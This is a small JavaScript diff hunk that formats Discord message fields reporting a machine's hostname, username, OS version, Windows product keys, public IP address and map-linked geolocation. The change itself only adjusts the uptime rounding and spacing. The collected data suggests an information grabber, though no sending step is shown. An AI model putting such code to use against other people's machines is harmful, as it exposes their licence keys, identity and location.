@@ -16,11 +16,12 @@ const json = async () => {
   const fields = [
     `<:dotfill:856638361678250044> RAM: ${filesize(os.totalmem())}`,
     `<:dotfill:856638361678250044> Name: ${os.hostname()}`,
-    `<:dotfill:856638361678250044> Uptime: <t:${Math.round(Date.now() / 1000) - os.uptime()}:R> (<t:${Math.round(Date.now() / 1000) - os.uptime()}:f>)`,
+    `<:dotfill:856638361678250044> Uptime: <t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:R> (<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:f>)`,
     `<:dotfill:856638361678250044> Username: ${os.userInfo().username}`,
     `<:dotfill:856638361678250044> OS version: ${os.version()}`,
     `<:dotfill:856638361678250044> Product Key: \`\`${require('./product-key').productKey}\`\``,
     `<:dotfill:856638361678250044> Backup Product Key: \`\`${require('./product-key').backupProductKey}\`\``,
+    '',
     '**IP info:**',
     `<:dotfill:856638361678250044> IP Address: [${await ipInfo('query')}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`,
     `<:dotfill:856638361678250044> Location: [${await ipInfo('lat')}, ${await ipInfo('lon')}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`,
